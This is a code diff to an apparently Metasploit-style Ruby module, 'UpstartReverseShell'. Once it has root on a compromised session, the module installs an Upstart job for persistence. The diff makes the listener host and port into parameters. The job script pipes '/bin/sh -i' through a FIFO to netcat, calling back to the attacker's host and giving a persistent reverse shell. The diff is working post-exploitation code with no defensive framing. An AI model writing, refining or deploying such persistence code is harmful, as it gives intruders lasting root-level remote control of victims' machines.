@@ -1,5 +1,5 @@
 module UpstartReverseShell
-  def self.run(fm, sid, client)
+  def self.run(fm, sid, client,lhost,lport)
     session = fm.sessions[sid]
     return unless session
 
@@ -19,9 +19,6 @@ module UpstartReverseShell
 
     client.print_good("Session #{sid} is root. Deploying Upstart reverse shell...")
 
-    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
-    attacker_port = 4444
-
     # Evitar duplicação
     if session.shell_command_token("test -f #{job_path} && echo 'EXISTS'").include?('EXISTS')
       client.print_status("Upstart job already exists. Skipping.")
@@ -40,7 +37,7 @@ module UpstartReverseShell
       script
         rm -f /tmp/.u
         mkfifo /tmp/.u
-        /bin/sh -i < /tmp/.u 2>&1 | nc #{attacker_ip} #{attacker_port} > /tmp/.u
+        /bin/sh -i < /tmp/.u 2>&1 | nc #{lhost} #{lport} > /tmp/.u
       end script
     UPSTART
 
